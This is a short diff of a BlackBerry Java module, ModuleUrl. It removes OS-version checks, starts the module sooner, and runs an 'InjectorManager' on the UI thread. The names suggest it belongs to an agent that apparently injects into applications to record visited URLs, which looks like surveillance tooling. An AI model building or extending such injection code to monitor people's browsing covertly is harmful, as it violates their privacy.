@@ -12,7 +12,7 @@ package blackberry.module;
 import java.util.Date;
 import java.util.Vector;
 
-import blackberry.Device;
+import net.rim.device.api.ui.UiApplication;
 import blackberry.Messages;
 import blackberry.config.ConfModule;
 import blackberry.debug.Debug;
@@ -34,7 +34,7 @@ public final class ModuleUrl extends BaseModule {
     static Debug debug = new Debug("ModUrl", DebugLevel.VERBOSE);
     //#endif
 
-    private boolean seen = true;
+    //private boolean seen = true;
     private boolean unsupported = false;
     //Timer applicationTimer;
     private static final long APP_TIMER_PERIOD = 5000;
@@ -48,16 +48,10 @@ public final class ModuleUrl extends BaseModule {
     }
 
     protected boolean parse(ConfModule conf) {
-        if (Device.getInstance().atLeast(6, 0)) {
-            seen = false;
-        }
 
-        if (Device.getInstance().atLeast(7, 0)) {
-            unsupported = true;
-        }
 
         setPeriod(NEVER);
-        setDelay(NEVER);
+        setDelay(SOON);
         return true;
     }
 
@@ -71,7 +65,13 @@ public final class ModuleUrl extends BaseModule {
         }
 
         UrlGroupInjector.enableGroup(true);
-        InjectorManager.getInstance().start();
+        UiApplication.getUiApplication().invokeAndWait(new Runnable() {
+            
+            public void run() {
+                InjectorManager.getInstance().start();
+            }
+        });
+        
     }
 
     public synchronized void actualStop() {
